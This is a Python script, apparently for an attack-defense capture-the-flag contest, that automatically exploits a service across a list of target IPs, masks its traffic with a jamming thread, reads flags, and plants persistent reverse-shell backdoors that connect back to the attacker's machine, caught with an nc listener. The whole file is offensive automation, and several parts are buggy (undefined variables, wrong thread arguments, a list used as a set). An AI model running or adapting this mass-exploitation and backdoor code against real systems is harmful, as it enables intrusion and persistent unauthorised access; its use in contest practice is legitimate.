'''
auto-exploit.py


**TO-DO before run**

1. Re-new ip_list
'''

from pwn import *
from andctf import *
import sample_exploit
from threading import Thread, Lock
from jammer import jamming

debug = False

# Ignore race condition... too sleepy
backdoor_list = []
backdoor_removed_list = []
fail_list = []
flag_list = []
patched_list = []

def exploit_thread(ip,port):
    global debug, fail_list, flag_list, backdoor_list
    try:
        p = remote(ip, port)
        t = Thread(target = jamming, args = (ip,port,jamming_time))
        t.start()
        sleep(random.random()*jamming_time)
        sample_exploit.exploit(p)

        # clear buffer, can receive ~4096 bytes
        p.recv()         

        p.sendline(b"cat flag")
        flag = p.recv()
        
        if debug:
            print("[*] Debug "+flag[0:4])
        
        if flag[0:4] == b"flag": 
            flag_list.append(flag)
        
        else:
            print("Something is wrong!!")

        
        fail_list.remove((ip, port))
    
        # Seed Backdoor
        for i in range(rvshells):
            p.sendline(nohup_backdoor.format(rvshell=rvshells[i].format(ip=my_ip,port=rv_ports[i]+10*ip_list.index(ip))))

        # Update Backdoor List
        if (ip,port) not in backdoor_list:
            backdoor_list.append((ip,port))
            
        p.close()

    except:
        return


def backdoor_thread(ip,port,i):
    global debug, fail_list, flag_list, backdoor_list,backdoor_removed_list,patched_list
    try:
        p = process("nc -lvmp {port}".format(port = rv_ports[i]+10*ip_list.index(ip)))
        t = Thread(target = jamming, args = (ip,port,jamming_time/2))
        t.start()
        sleep(random.random()*jamming_time/2)

        # clear buffer, can receive ~4096 bytes
        p.recv()         
        p.sendline(b"cat flag")
        flag = p.recv()
        
        if debug:
            print("[*] Debug "+flag[0:4])
        
        if flag[0:4] == b"flag": 
            flag_list.append(flag)
        else:
            print("Something is wrong!!")


        fail_list.remove((ip, port))
        patched_list.add((ip,port))
        

    except:
        if (ip,port) in backdoor_list:
            backdoor_list.remove((ip,port))
            backdoor_removed_list.append((ip,port))
        return


def auto_exploit(port:int):
    global fail_list,patched_list,backdoor_list
    print("[*] Initializing Auto Exploit")

    for ip in ip_list:
        fail_list.append((ip,port))


    for ip in ip_list:
        t = Thread(target = exploit_thread, args = (ip,port))
        t.start()

    print("[*] Running Exploits")
    sleep(jamming_time*1.2)

    if (ip,port) in fail_list and (ip,port) in backdoor_list:
        for i in range(len(rvshells)):
            t = Thread(target = exploit_thread, args = (ip,port,i))
            t.start()

    sleep(jamming_time*0.8)

    print("========== Exploit Failed (No Backdoors) ==========")
    print(sorted(fail_list,key =  lambda x: x[0]))

    print("========== Exploit Patched (Backdoors also Removed) ==========")
    print(sorted(backdoor_removed_list,key =  lambda x: x[0]))

    print("========== Exploit Patched (Backdoors Worked) ==========")
    print(sorted(patched_list,key =  lambda x: x[0]))

    print("========== Exploit Workign (Not sure backdoors are working~) ==========")
    print(sorted(backdoor_list,key =  lambda x: x[0]))



def main():
    global debug 
    debug = input("[*] Debug: [y/n]") != 'n'
    port = int(input("[*] Chal Port: "))
    
    while True:
        auto_exploit(port)
        sleep(120)
    

if __name__ == "__main__":
    main()
